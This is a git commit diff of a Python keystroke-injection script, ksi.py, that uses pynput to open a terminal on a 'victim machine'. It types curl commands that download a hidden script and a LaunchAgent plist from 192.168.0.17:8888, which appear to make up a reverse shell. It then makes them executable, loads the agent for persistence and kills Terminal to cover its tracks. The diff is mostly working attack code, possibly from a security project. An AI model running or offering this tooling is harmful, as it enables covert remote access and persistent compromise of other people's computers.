aa0c890ce48dc8337e7f1cd411dbc1f77bf9d0f4
Massimiliano Mirelli <massimiliano.mirelli@aalto.fi>
2020-05-01 17:09:30 +0300

    MacOS ready

--- ksi.py
+++ ksi.py
@@ -11,14 +11,69 @@ parser.add_argument('--os', type=str, default='MacOS',
 
 args = parser.parse_args()
 
-print(args.os)
+def mac_shell(kb):
+	kb.press(Key.cmd_r)
+	kb.press(' ')
+	kb.release(' ')
+	kb.release(Key.cmd_r)
+	sleep(.2)
+	kb.type('terminal')
+	sleep(.2)
+	enter(keyboard)
+
+def linux_shell(kb):
+	kb.press(Key.ctrl_l)
+	kb.press(Key.alt_l)
+	kb.press('t')
+	kb.release(Key.ctrl_l)
+	kb.release(Key.alt_l)
+	kb.release('t')
+
+def win_cmd(kb):
+	# here pynput code for activating win cmd
+	pass
+
+def enter(kb):
+	kb.press(Key.enter)
+	kb.release(Key.enter)
+	
+def type_cmd(kb, command):
+	sleep(.1)
+	kb.type(command)
+	sleep(.2)
+	enter(kb)
 
 keyboard = Controller()
 sleep(5)
-keyboard.press(Key.cmd_r)
-keyboard.press(' ')
-keyboard.release(' ')
-keyboard.release(Key.cmd_r)
-sleep(1)
-keyboard.type('Nitratine')
 
+CRON_DEST_FN = '' # filename of the cron file in the victim machine
+PAYLOAD_FN = '' # filename of the payload which must be in ./args.os/
+
+if (args.os == 'MacOS'):
+	mac_shell(keyboard)
+	PAYLOAD_FN = 'rs.plist'
+	SCRIPT_FN = 'rs.sh'
+	CRON_DEST_FN = './Library/LaunchAgents/rs.plist'
+	SCRIPT_DEST_FN = './Applications/.rs.sh'
+	
+elif (args.os == 'Linux'):
+	linux_shell(keyboard)
+else:
+	win_cmd(keyboard)
+
+
+get_cron = f'curl -o {CRON_DEST_FN} '+\
+		f'-O http://192.168.0.17:8888/{args.os}/{PAYLOAD_FN} && '+\
+		f'chmod 755 {CRON_DEST_FN}'
+print(get_cron)
+type_cmd(keyboard, get_cron) 
+
+get_script = f'curl -o {SCRIPT_DEST_FN}'+\
+		f' -O http://192.168.0.17:8888/{args.os}/{SCRIPT_FN} && '+\
+		f'chmod 755 {SCRIPT_DEST_FN}'
+print(get_script)
+type_cmd(keyboard, get_script)
+
+type_cmd(keyboard, 'launchctl load Library/LaunchAgents/rs.plist')
+
+type_cmd(keyboard, 'killall Terminal')
